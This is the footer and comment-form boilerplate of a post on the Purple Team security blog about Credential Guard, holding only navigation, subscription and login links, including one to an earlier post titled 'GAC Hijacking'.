Save my name, email, and website in this browser for the next time I comment.

Comment

Δ

Previous Post

[GAC Hijacking](https://ipurple.team/2026/02/10/gac-hijacking/)

[Toggle photo metadata visibility](https://ipurple.team/2026/03/17/credential-guard/#)[Toggle photo comments visibility](https://ipurple.team/2026/03/17/credential-guard/#)

Loading Comments...

Write a Comment...

Email (Required)Name (Required)Website

- [Comment](https://ipurple.team/2026/03/17/credential-guard/#respond)
- [Reblog](https://ipurple.team/2026/03/17/credential-guard/)
- [Subscribe](https://ipurple.team/2026/03/17/credential-guard/) [Subscribed](https://ipurple.team/2026/03/17/credential-guard/)








  - [![](https://ipurple.team/wp-content/uploads/2023/11/purple-unicorn-hacking-a-computer-1-2.jpg?w=50) Purple Team](https://ipurple.team/)

Join 117 other subscribers

Sign me up

  - Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fipurple.team%252F2026%252F03%252F17%252Fcredential-guard%252F)


- - [![](https://ipurple.team/wp-content/uploads/2023/11/purple-unicorn-hacking-a-computer-1-2.jpg?w=50) Purple Team](https://ipurple.team/)
  - [Subscribe](https://ipurple.team/2026/03/17/credential-guard/) [Subscribed](https://ipurple.team/2026/03/17/credential-guard/)
  - [Sign up](https://wordpress.com/start/)
  - [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fipurple.team%252F2026%252F03%252F17%252Fcredential-guard%252F)
  - [Copy shortlink](https://wp.me/pffK4K-xp)
  - [Report this content](https://wordpress.com/abuse/?report_url=https://ipurple.team/2026/03/17/credential-guard/)
  - [View post in Reader](https://wordpress.com/reader/blogs/225397078/posts/2071)
  - [Manage subscriptions](https://subscribe.wordpress.com/)
  - [Collapse this bar](https://ipurple.team/2026/03/17/credential-guard/)

%d